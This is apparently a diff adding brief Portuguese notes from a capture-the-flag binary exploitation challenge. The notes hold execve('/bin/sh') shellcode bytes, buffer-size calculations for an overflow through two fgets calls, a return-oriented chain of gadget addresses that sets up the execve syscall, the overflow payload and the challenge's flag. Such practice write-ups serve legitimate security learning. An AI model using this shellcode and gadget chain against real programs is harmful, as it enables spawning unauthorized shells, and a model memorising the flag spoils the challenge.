@@ -1,0 +1,39 @@
+shellcodex64 = \x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05
+
+codigo:
+nome 	       --> tamanho 16
+sobrenome      --> tamanho 15
+nome+sobrenome --> tamanho 31
+leituras fgets --> 20+15 = tamanho 35
+segm_fault     -->  = tamanho 36 
+				   
+				   
+preciso:
+rax
+rdi
+rsi
+rdx
+
+59 sys_execve	
+
+
+0x00000000004520c7: pop rax; ret;
+59
+0x000000000040191a: pop rdi; ret; 	
+004c00f0
+0x000000000040f29e: pop rsi; ret; 
+0
+0x000000000040181f: pop rdx; ret; 
+0
+0x000000000041e034: syscall; ret; 
+
+v1 --> f4b640e7c5ffa77717033158e4068fa3
+
+payload --> /bin/sh\x001234567890
+assim, o segundo fgets vai levar uma quantidade excessiva de caracteres.
+
+
+flag: gris{Return_to_shell_Programing}
+
+
+
